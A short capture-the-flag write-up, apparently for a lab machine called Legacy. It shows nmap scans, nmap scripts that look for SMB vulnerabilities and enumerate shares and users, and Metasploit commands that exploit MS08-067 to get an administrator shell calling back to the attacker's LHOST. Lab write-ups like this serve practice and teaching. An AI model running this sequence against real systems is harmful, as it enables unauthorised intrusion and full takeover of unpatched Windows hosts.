**Ping** 
```
Ping 10.10.10.4
```
![[Pasted image 20240611165916.png]]

Nmap default Scan
```
nmap 10.10.10.4 -oN dnmap
```
![[Pasted image 20240611170118.png]]

Script and Service Scan
```
nmap 10.10.10.4 -sC -sV -oN snmap
```
![[Pasted image 20240611170138.png]]

All port Scan
```
nmap 10.10.10.4 -sC -sV -p- --open -T5 -oN anmap
```
![[Pasted image 20240611170617.png]]

SMB Enumeration
```
nmap --script smb-vuln* --script smb-enum-shares.nse --script smb-enum-users.nse -p139,445 10.10.10.4 -oN smb_enum
```
![[Pasted image 20240611171555.png]]
We have vulnerable smb running on the machine.

Will try to exploit it...!

Using Metasploit
```
msfconsole
```
![[Pasted image 20240611182456.png]]

```
search ms08_067
use 0
set RHOST 10.10.10.4
set LHOST 10.10.14.7
exploit
shell
```
![[Pasted image 20240611182623.png]]
We are already Administrator, so no need Privilege escalation

We got user.txt in John's desktop
![[Pasted image 20240611182708.png]]

We got root.txt in Admin's desktop
![[Pasted image 20240611182734.png]]




Done with Legacy.....:)
